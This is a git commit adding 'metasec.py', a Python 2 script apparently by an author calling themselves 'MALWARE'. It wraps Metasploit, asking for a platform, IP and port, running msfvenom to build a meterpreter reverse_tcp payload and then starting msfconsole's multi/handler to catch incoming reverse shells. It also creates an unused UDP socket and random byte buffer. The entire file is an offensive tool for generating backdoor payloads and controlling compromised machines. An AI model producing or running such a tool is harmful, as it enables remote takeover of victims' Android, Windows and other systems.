04adfe2bbdf7657323588c71f092777b6ba9c926
MALWARE <57804710+MALW4R3@users.noreply.github.com>
2020-04-21 16:49:40 +0700

    Add files via upload

---
+++ metasec.py
@@ -0,0 +1,41 @@
+import os,sys
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system ("figlet -f slant METASEC")
+time.sleep(3)
+os.system ("clear")
+os.system ("figlet PAYLOAD")
+print
+print " PLEASE INSTALL METASPLOIT "
+print
+la = raw_input ("android/python/php/windows : ")
+ip = raw_input ("IP : ")
+port = raw_input ("PORT : ")
+out = raw_input ("OUTPUT : ")
+os.system ("msfvenom -p %s/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s" % (la, ip, port, out))
+os.system ("clear")
+os.system ("figlet EXPLOIT")
+print
+print " PROGRAM BY DEFALT "
+print
+la = raw_input ("android/python/php/windows : ")
+ip = raw_input ("IP : ")
+port = raw_input ("Port : ")
+os.system ("msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD %s/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; exploit;'" % (la, ip, port,))
+
+
